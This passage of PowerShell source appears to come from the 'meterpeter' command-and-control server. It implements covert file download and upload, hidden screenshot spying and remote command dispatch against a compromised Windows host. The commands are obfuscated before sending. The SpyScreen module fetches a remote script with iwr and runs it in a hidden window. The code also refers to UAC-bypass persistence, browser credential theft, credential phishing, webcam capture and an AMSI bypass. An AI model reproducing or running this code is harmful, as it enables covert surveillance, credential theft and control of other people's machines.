        write-host "   The file will be stored in meterpeter C2 working directory." -ForegroundColor Yellow;
        write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
        write-host "   -------   -----------                     ------------------";
        write-host "   Start     Download from rhost to lhost    UserLand";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Download> " -NoNewline -ForeGroundColor Green;
        $Download_choise = Read-Host;
        If($Download_choise -ieq "Start")
        {
           Write-Host " - Download Remote File: " -NoNewline;
           $File = Read-Host;

           If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
           {
              $Command = "`$1=`"#`";If(!(`"`$1`" -like `"*\*`") -and !(`"`$1`" -like `"*/*`")){`$1=`"`$pwd\`$1`"};If(([System.IO.File]::Exists(`"`$1`"))){[io.file]::ReadAllBytes(`"`$1`") -join ','}";
              $Command = ChkDskInternalFuncio(Char_Obf($Command));
              $Command = $Command -replace "#","$File";
              $File = $File.Split('\')[-1];
              $File = $File.Split('/')[-1];
              $File = "$IPATH$File";
              $Save = $True;
           } Else {
              Write-Host "`n";
              $File = $Null;
              $Command = $Null;
           }
      }
      If($Download_choise -ieq "Return" -or $Download_choise -ieq "cls" -or $Download_choise -ieq "Modules" -or $Download_choise -ieq "clear")
      {
         $Command = $Null;
         $Download_choise = $Null;
      }
    }

    If($Command -ieq "Upload")
    {
        write-host "`n`n   Remark:" -ForegroundColor Yellow;
        write-host "   Allways input absoluct path of the file to be uploaded.";
        write-host "   Avoid uploading LARGE\HUGE files with tcp connections." -ForegroundColor Yellow;
        write-host "   The file will be uploaded to Client working directory." -ForegroundColor Yellow;
        write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
        write-host "   -------   -----------                     ------------------";
        write-host "   Start     Upload from lhost to rhost      UserLand";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Upload> " -NoNewline -ForeGroundColor Green;
        $Upload_choise = Read-Host;
        If($Upload_choise -ieq "Start")
        {
           Write-Host " - Upload Local File: " -NoNewline;
           $File = Read-Host;

           If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
           {

              If(!("$File" -like "*\*") -and !("$File" -like "*/*"))
              {
                 $File = "$IPATH$File";
              }

              If(([System.IO.File]::Exists("$File")))
              {
                 $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
                 $FileBytes = "($FileBytes)";
                 $File = $File.Split('\')[-1];
                 $File = $File.Split('/')[-1];
                 $Command = "`$1=`"`$pwd\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"}";
                 $Command = ChkDskInternalFuncio(Char_Obf($Command));
                 $Command = $Command -replace "#","$File";
                 $Command = $Command -replace "@","$FileBytes";
                 $Upload = $True;
              } Else {
                 Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
                 Write-Host "   ------   ---------";
                 Write-Host "   Failed   File Missing: $File`n" -ForeGroundColor red;
                 $Command = $Null;
              }
           } Else {
              Write-Host "`n";
              $Command = $Null;
           }
           $File = $Null;
      }
      If($Upload_choise -ieq "Return" -or $Upload_choise -ieq "cls" -or $Upload_choise -ieq "Modules" -or $Upload_choise -ieq "clear")
      {
         $Command = $Null;
         $Upload_choise = $Null;
      }
    }

    If($Command -ieq "Screenshot")
    {
        write-host "`n`n   Description:" -ForegroundColor Yellow;
        write-host "   This module can be used to take desktop screenshot(s)";
        write-host "   Remark: Snapshot auto-downloads the screenshots from 'RHOST'" -ForegroundColor Yellow;
        write-host "   Remark: SpyScreen captures in background and stores on %TMP%" -ForegroundColor Yellow;
        write-host "`n`n   Modules     Description                     Privileges Required" -ForegroundColor green;
        write-host "   -------     -----------                     ------------------";
        write-host "   Snapshot    Capture one desktop_screenshot  UserLand";
        write-host "   SpyScreen   Capture multiple screenshots    UserLand";
        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Screenshots> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Snapshot")
        {
           $Obf = "-Ass" + "embl" + "yName" -join ''
           $File = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
           Write-Host " * Screenshot File:'" -ForegroundColor Green -NoNewline
           Write-Host "$File.png" -ForegroundColor DarkGray -NoNewline
           Write-Host "'" -ForegroundColor Green
           write-host "   => " -ForegroundColor DarkYellow -NoNewline
           write-host "Remark: wait for module to finish.." -ForegroundColor DarkGray
           
           $Command = "`$FilePath=`"`$Env:TMP\#`";Add-Type $Obf System.Windows.Forms;`$Microsof=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);`$Catrapilar=[System.Drawing.Graphics]::FromImage(`$Microsof);`$Catrapilar.CopyFromScreen((New-Object System.Drawing.Point(0,0)),(New-Object System.Drawing.Point(0,0)),`$Microsof.Size);`$Catrapilar.Dispose();Start-Sleep -Milliseconds 200;`$Microsof.Save(`"`$FilePath`");If(([System.IO.File]::Exists(`"`$FilePath`"))){[io.file]::ReadAllBytes(`"`$FilePath`") -join ',';Remove-Item -Path `"`$FilePath`" -Force}";
           $Command = $Command -replace "#","$File";
           $File = "$pwd\$File.png";
           $Save = $True;        
        }
        If($choise_two -ieq "SpyScreen")
        {
           [int]$Inbetween = 1
           Write-Host " - Take how many captures: " -NoNewline;
           [int]$Captures = Read-Host;
           
           If(-not($Captures) -or $Captures -lt 1)
           {
              [int]$Captures = 1
           }
           ElseIf($Captures -gt 1)
           {
              Write-Host " - Time between captures : " -NoNewline;
              [int]$Inbetween = Read-Host;
           }

           If($Captures -gt 3 -or $Inbetween -gt 5)
           {
              $TotalSpyTime = $Captures * $Inbetween
              write-host " *" -ForegroundColor Green -NoNewline;
              write-host " Background Screenshot Execution.`n`n" -ForegroundColor Green;

              ## Create Data Table for output
              $mytable = New-Object System.Data.DataTable
              $mytable.Columns.Add("Captures")|Out-Null
              $mytable.Columns.Add("DelayTime")|Out-Null
              $mytable.Columns.Add("TotalTime")|Out-Null
              $mytable.Columns.Add("FileStorage")|Out-Null
              $mytable.Rows.Add("$Captures",
                                "$Inbetween (sec)",
                                "$TotalSpyTime (sec)",
                                "%tmp%\Meterpeter.zip")|Out-Null

              ## Display Data Table
              $mytable | Format-Table -AutoSize
              $Command = "iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Screenshot.ps1 -OutFile `$Env:TMP\Screenshot.ps1|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-File $Env:TMP\Screenshot.ps1 -Screenshot $Captures -Delay $Inbetween`""           
           }
           Else
           {
              #Run command
              $Command = "iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Screenshot.ps1 -OutFile `$Env:TMP\Screenshot.ps1|Out-Null;powershell -File `"`$Env:TMP\Screenshot.ps1`" -Screenshot $Captures -Delay $Inbetween"
           }
        }
        If($choise_two -ieq "Return" -or $choise_two -ieq "cls" -or $choise_two -ieq "Modules" -or $choise_two -ieq "clear")
        {
           $Command = $Null;
           $choise_two = $Null;
        }
    }


    If(!([string]::IsNullOrEmpty($Command)))
    {
      If(!($Command.length % $Bytes.count))
      {
        $Command += " ";
      }

      $SendByte = ([text.encoding]::ASCII).GetBytes($Command);

      Try {

        $Stream.Write($SendByte,0,$SendByte.length);
        $Stream.Flush();
      }

      Catch {

        Write-Host "`n [x] Connection Lost with $Remote_Host !" -ForegroundColor Red -BackGroundColor white;
        $webroot = Test-Path -Path "$env:LocalAppData\webroot\";If($webroot -ieq $True){cmd /R rmdir /Q /S "%LocalAppData%\webroot\"};
        Start-Sleep -Seconds 4;
        $Socket.Stop();
        $Client.Close();
        $Stream.Dispose();
        Exit;
      }
      $WaitData = $True;
    }

    If($Command -ieq "Exit")
    {
      write-Host "`n";
      Write-Host "[x] Closing Connection with $Remote_Host!" -ForegroundColor Red -BackGroundColor white;
      $check = Test-Path -Path "$env:LocalAppData\webroot\";
      If($check -ieq $True)
      {
        Start-Sleep -Seconds 2;
        write-host "[i] Deleted: '$env:LocalAppData\webroot\'" -ForegroundColor Yellow;
        cmd /R rmdir /Q /S "%LocalAppData%\webroot\";
      }

      If(Test-Path -Path "${IPATH}${payload_name}.ps1" -EA SilentlyContinue)
      {
         Remove-Item -Path "${IPATH}${payload_name}.ps1" -ErrorAction SilentlyContinue -Force
         write-host "[i] Deleted: '${IPATH}${payload_name}.ps1'" -ForegroundColor Yellow
      }

      Start-Sleep -Seconds 3

      Clear-Host
      write-host $EndBanner
      write-host "      * GitHub: https://github.com/r00t-3xp10it/meterpeter *`n" -ForegroundColor DarkYellow

      $Socket.Stop();
      $Client.Close();
      $Stream.Dispose();
      Exit;
    }

    If($Command -ieq "Clear" -or $Command -ieq "Cls" -or $Command -ieq "Clear-Host" -or $Command -ieq "return" -or $Command -ieq "modules")
    {
      Clear-Host;
      #Write-Host "`n$Modules";
    }
    $Command = $Null;
  }

  If($WaitData)
  {
    While(!($Stream.DataAvailable))
    {
      Start-Sleep -Milliseconds 1;
    }

    If($Stream.DataAvailable)
    {
      While($Stream.DataAvailable -or $Read -eq $Bytes.count)
      {
        Try {

          If(!($Stream.DataAvailable))
          {
            $Temp = 0;

            While(!($Stream.DataAvailable) -and $Temp -lt 1000)
            {
              Start-Sleep -Milliseconds 1;
              $Temp++;
            }

            If(!($Stream.DataAvailable))
            {
              Write-Host "`n [x] Connection Lost with $Remote_Host!" -ForegroundColor Red -BackGroundColor white;
              $webroot = Test-Path -Path "$env:LocalAppData\webroot\";If($webroot -ieq $True){cmd /R rmdir /Q /S "%LocalAppData%\webroot\"};
              Start-Sleep -Seconds 5;
              $Socket.Stop();
              $Client.Close();
              $Stream.Dispose();
              Exit;
            }
          }

          $Read = $Stream.Read($Bytes,0,$Bytes.length);
          $OutPut += (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0,$Read);
        }

        Catch {

          Write-Host "`n [x] Connection Lost with $Remote_Host!" -ForegroundColor Red -BackGroundColor white;
          $webroot = Test-Path -Path "$env:LocalAppData\webroot\";If($webroot -ieq $True){cmd /R rmdir /Q /S "%LocalAppData%\webroot\"};
          Start-Sleep -Seconds 5;
          $Socket.Stop();
          $Client.Close();
          $Stream.Dispose();
          Exit;
        }
      }

      If(!($Info))
      {
        $Info = "$OutPut";
      }

      If($OutPut -ne " " -and !($Save) -and !($Upload))
      {
        Write-Host "`n$OutPut";
      }

      If($Save)
      {
        If($OutPut -ne " ")
        {
          If(!([System.IO.File]::Exists("$File")))
          {
            $FileBytes = IEX("($OutPut)");
            [System.IO.File]::WriteAllBytes("$File",$FileBytes);
            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
            Write-Host "   ------   ---------";
            Write-Host "   saved    $File`n";
            $Command = $Null;
          } Else {
            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
            Write-Host "   ------   ---------";
            Write-Host "   Failed   $File (Already Exists)`n" -ForegroundColor Red;
            $Command = $Null;
          }
        } Else {
          Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
          Write-Host "   ------   ---------";
          Write-Host "   Failed   File Missing`n" -ForegroundColor Red;
          $Command = $Null;
        }
        $File = $Null;
        $Save = $False;
        $Command = $Null; 
      }

      If($Upload)
      {
        If($OutPut -ne " ")
        {
          If($Cam_set -ieq "True")
          {
            write-host "`n`n    CommandCam syntax" -ForeGroundColor Green;
            write-host "    -----------------";
            Write-Host "  :meterpeter> .\CommandCam.exe /devlist`n";
            $Cam_set = "False";

          }ElseIf($SluiEOP -ieq "True"){
          
            cd mimiRatz
            ## Revert SluiEOP [<MakeItPersistence>] to defalt [<False>]
            $CheckValue = Get-Content SluiEOP.ps1|Select-String "MakeItPersistence ="
            If($CheckValue -match 'True'){((Get-Content -Path SluiEOP.ps1 -Raw) -Replace "MakeItPersistence = `"True`"","MakeItPersistence = `"False`"")|Set-Content -Path SluiEOP.ps1 -Force}
            cd ..

            Write-Host "`n`n   Status   Remote Path" -ForeGroundColor green;
            write-host "   ------   -----------"
            Write-Host "   Saved    $OutPut`n"
            $SluiEOP = "False"

         }ElseIf($COMEOP -ieq "True"){

            cd mimiRatz
            ## Revert CompDefault [<MakeItPersistence>] to defalt [<False>]
            $CheckValue = Get-Content CompDefault.ps1|Select-String "MakeItPersistence ="
            If($CheckValue -match 'True'){((Get-Content -Path CompDefault.ps1 -Raw) -Replace "MakeItPersistence = `"True`"","MakeItPersistence = `"False`"")|Set-Content -Path CompDefault.ps1 -Force}
            cd ..

            Write-Host "`n`n   Status   Remote Path" -ForeGroundColor green;
            write-host "   ------   -----------"
            Write-Host "   Saved    $OutPut`n"
            $COMEOP = "False"

          }else{
            $OutPut = $OutPut -replace "`n","";
            If($OutPut -match "GetBrowsers.ps1"){
                $sanitize = $OutPut -replace 'GetBrowsers.ps1','GetBrowsers.ps1 '
                $OutPut = $sanitize.split(' ')[0] # Get only the 1º upload path
            }
            Write-Host "`n`n   Status   Remote Path" -ForeGroundColor green;
            Write-Host "   ------   -----------";
            Write-Host "   saved    $OutPut`n";
          }
          If($Tripflop -ieq "True")
          {
            Write-Host "   execute  :meterpeter> Get-Help ./GetBrowsers.ps1 -full`n" -ForeGroundColor Yellow;
            $Tripflop = "False";
          }
          If($Flipflop -ieq "True")
          {
            write-host "   Remark   Client:Admin triggers 'amsistream-ByPass(PSv2)'`n" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
            $Flipflop = "False";
          }
          If($Camflop  -ieq "True")
          {
            write-host "`n`n    CommandCam syntax" -ForeGroundColor Green;
            write-host "    -----------------";
            Write-Host "  :meterpeter> .\CommandCam.exe`n";
            $Camflop = "False";
          }
          If($Phishing  -ieq "True")
          {
            $OutPut = $OutPut -replace ".ps1",".log";
            write-host "   output   $OutPut`n";
            $Phishing = "False";
          }
          If($NewPhishing  -ieq "True")
          {
            $OutPut = $OutPut -replace "NewPhish.ps1","CredsPhish.log";
            write-host "   output   $OutPut`n";
            $NewPhishing = "False";
          }
          $Command = $Null;
        } Else {
          Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
          Write-Host "   ------   ---------";
          Write-Host "   Failed   $File (Already Exists Remote)`n" -ForeGroundColor red;
          $Command = $Null;
        }
        $Upload = $False;
      }
    $WaitData = $False;
    $Read = $Null;
    $OutPut = $Null;
  }
 }
}